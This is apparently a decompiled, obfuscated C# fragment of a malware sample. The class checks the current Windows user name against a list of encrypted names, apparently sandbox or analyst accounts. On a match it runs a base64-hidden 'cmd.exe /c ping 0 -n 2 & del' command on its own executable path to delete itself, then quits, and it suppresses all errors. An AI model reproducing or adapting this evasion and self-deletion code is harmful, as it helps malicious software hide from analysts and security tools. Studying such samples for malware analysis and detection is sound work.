using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns14;

namespace ns4;

public class GClass4
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			List<string> list = new List<string>();
			list.Add(Conversions.ToString(Class0.smethod_26("xhD69hZG0BL6CW8a0SdvKg==")));
			list.Add(Conversions.ToString(Class0.smethod_26("+GlT+x45qyFSTIHYlcc7wg==")));
			list.Add(Conversions.ToString(Class0.smethod_26("0NoYTJuXEUmWbIkcFO9d+A==")));
			list.Add(Conversions.ToString(Class0.smethod_26("ZmIv2JCl22DtsNE75TibcA==")));
			list.Add(Conversions.ToString(Class0.smethod_26("0kAkkXFq6I7d9IDVBTVULw==")));
			list.Add(Conversions.ToString(Class0.smethod_26("mVvQpldO7wl6ZXhif8ZPmQ==")));
			list.Add(Conversions.ToString(Class0.smethod_26("qw+FIXy3CGXsdIVfY2aGSg==")));
			list.Add(Conversions.ToString(Class0.smethod_26("yLmN/FwGRXbYD1rWY/mmlg==")));
			list.Add(Conversions.ToString(Class0.smethod_26("0kAkkXFq6I7d9IDVBTVULw==")));
			list.Add(Conversions.ToString(Class0.smethod_26("ICrhyKz63S9sUTPB9Z/RC9bjfvo3vJt4ar6qcb6bNBQ=")));
			foreach (string item in list)
			{
				if (Operators.CompareString(Environment.UserName, item, false) == 0)
				{
					Interaction.Shell(Class0.smethod_4(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.get_ExecutablePath() + "\"", (AppWinStyle)0, false, -1);
					ProjectData.EndApp();
					continue;
				}
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
